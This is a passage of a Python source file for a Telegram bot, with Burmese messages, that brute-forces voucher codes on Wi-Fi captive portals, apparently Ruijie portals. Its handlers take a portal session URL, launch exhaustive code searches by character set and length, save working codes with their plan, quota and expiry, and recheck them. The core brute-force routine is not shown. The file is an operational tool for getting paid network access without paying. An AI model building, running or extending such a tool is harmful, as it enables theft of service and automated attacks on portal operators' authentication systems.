                log.debug(f"[session_recheck] error for {cid}: {e}")


# ── Bot commands ────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")


@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ **Setup**:\n   /setup <url>\n\n"
        "၂။ **ရှာဖွေခြင်း**:\n   /brute <mode> <length> [target]\n"
        "   Mode:\n     1 = ဂဏန်းသီးသန့် (0-9)\n     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n   ဥပမာ: /brute 1 6 5\n\n"
        "၃။ /status  – အခြေအနေကြည့်\n၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
        "၉။ /notify  – Notification ON/OFF"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")


@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url\n\nဥပမာ:\nhttps://portal-mm-as.ruijienetworks.com/...")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        portal_config, portal_name = get_portal_config(url)
        user_data[cid] = {'session_url': url, 'portal_type': portal_name}
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        try:
            results, _ = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await safe_update_github("result.json", results, f"Clear codes for {cid}")
        except Exception as e:
            log.error(f"[setup] GitHub clear error: {e}")
        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")


@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\n\n"
            "Mode:\n  1-5\n\nဥပမာ:\n/brute 1 6 5\n/brute 2 6\n/brute 5 8 10")
        return

    try:
        mode = int(args[1])
        length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        if mode not in [1, 2, 3, 4, 5]:
            await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်းဖြစ်ရပါမည်။")
            return
        if length < 1 or length > 12:
            await bot.reply_to(message, "❌ Length သည် 1-12 အတွင်းဖြစ်ရပါမည်။")
            return
        if target is not None and target < 1:
            await bot.reply_to(message, "❌ Target သည် 1 ထက်ကြီးရပါမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "❌ Mode, Length, Target များသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, target: {prev['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message)


async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {
        "task": task, "stop": False, "scan_id": scan_id,
        "mode": mode, "length": length, "target": target,
        "plan_filters": plan_filters,
    }
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)


@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        last_scan_params[chat_id] = {
            "mode": data.get("mode"),
            "length": data.get("length"),
            "target": data.get("target"),
            "plan_filters": data.get("plan_filters", []),
        }
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ဆက်လုပ်ပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")


@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('length', 6),
                            params['target'], message,
                            plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")


@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('length', 6),
                                params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('length', 6),
                                    params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)


@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c = item["code"]
            plan = item.get("plan", "N/A")
            usage = item.get("usage", "N/A")
            quota = item.get("quota", "N/A")
            expire = item.get("expire", "N/A")
            portal = item.get("portal", "N/A")
            line = f"`{c}` – ⏳ {plan}"
            if usage != "N/A":
                line += f"\n   📊 Usage: {usage}"
            if quota != "N/A":
                line += f"\n   💾 Quota: {quota}"
            if expire != "N/A":
                line += f"\n   📅 Expire: {expire}"
            if portal != "N/A":
                line += f"\n   🌐 Portal: {portal}"
            parts.append(line)
            parts.append("")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    if len(full_text) > TG_MAX_LEN:
        for i in range(0, len(full_text), TG_MAX_LEN):
            await bot.send_message(chat_id, full_text[i:i + TG_MAX_LEN], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")


@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

    try:
        results, _ = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await safe_update_github("result.json", results, f"Clear codes for {chat_id}")
    except Exception as e:
        log.error(f"[delete_saved] Error: {e}")

    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")


@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    _cleanup_old_chats()
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")


@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return

    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    sem = asyncio.Semaphore(10)

    async def check_one(item):
        async with sem:
            if is_expired(item.get("expire", "N/A")):
                return ("expired", item)
            recode = await perform_check(
                user_data[chat_id]['session_url'], item["code"], chat_id,
                recheck=True, message=message
            )
            return ("valid" if recode else "invalid", item)

    tasks = [check_one(i) for i in success]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    new_success, removed_expired, removed_invalid = [], [], []
    for r in results:
        if isinstance(r, Exception):
            continue
        status, item = r
        if status == "valid":
            new_success.append(item)
        elif status == "expired":
            removed_expired.append(item["code"])
        else:
            removed_invalid.append(item["code"])

    success_texts[chat_id] = new_success

    try:
        results_json, _ = await get_file_content("result.json")
        cid_str = str(chat_id)
        if cid_str in results_json:
            kept_codes = {i["code"] for i in new_success}
            results_json[cid_str] = [r for r in results_json[cid_str] if r.get("code") in kept_codes]
            await safe_update_github("result.json", results_json, f"Recheck cleanup for {chat_id}")
    except Exception as e:
        log.error(f"[recheck] GitHub sync error: {e}")

    msg_parts = []
    if new_success:
        msg_parts.append(f"✅ Still Valid ({len(new_success)}):\n" + "\n".join([i["code"] for i in new_success]))
    if removed_expired:
        msg_parts.append(f"⏰ Expired (removed) ({len(removed_expired)}):\n" + "\n".join(removed_expired))
    if removed_invalid:
        msg_parts.append(f"❌ Invalid (removed) ({len(removed_invalid)}):\n" + "\n".join(removed_invalid))
    if not msg_parts:
        msg_parts.append("Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

    await bot.reply_to(message, _truncate("\n\n".join(msg_parts)))


@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)

    sem_info = "N/A"
    if _voucher_sem is not None:
        try:
            used = CONCURRENCY - _voucher_sem._value
            sem_info = f"{used}/{CONCURRENCY}"
        except Exception:
            sem_info = f"?/{CONCURRENCY}"

    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n👥 Sessions Loaded: {len(user_data)}\n"
        f"⚡ Concurrency Limit: {CONCURRENCY}\n🔒 Semaphore In-Use: {sem_info}\n"
        f"📦 Batch Size: {BATCH_SIZE}\n📨 Queued Success: {SUCCESS_CODE.qsize()}\n"
        f"🌐 Default Portal: {DEFAULT_PORTAL}"
    )


@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    chat_id = message.chat.id

    targets = []
    for cid, items in success_texts.items():
        for item in items:
            targets.append({
                "chat_id": cid, "code": item["code"], "session_id": item["session_id"],
                "plan": item.get("plan", "N/A"), "portal": item.get("portal", "N/A")
            })

    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။")
        return

    await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")

    for t in targets[:3]:
        sid = t["session_id"]
        code = t["code"]
        portal_name = t.get("portal", DEFAULT_PORTAL)
        portal_config = PORTAL_CONFIGS.get(portal_name, PORTAL_CONFIGS[DEFAULT_PORTAL])
        balance_info = await get_balance(sid, portal_config)

        result = (
            f"🎯 Code: `{code}`\n🔑 Session ID: `{sid}`\n🌐 Portal: {portal_name}\n"
            f"⏳ Time: {balance_info.get('time', 'N/A')}\n📊 Usage: {balance_info.get('usage', 'N/A')}\n"
            f"💾 Quota: {balance_info.get('quota', 'N/A')}\n📋 Plan: {balance_info.get('plan', 'N/A')}\n"
            f"📅 Expire: {balance_info.get('expire', 'N/A')}"
        )
        await bot.send_message(chat_id, result, parse_mode="Markdown")


# ── Polling and main ────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log.warning(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        await _recover_pending_queue()
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(session_recheck_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()


if __name__ == '__main__':
    asyncio.run(main())
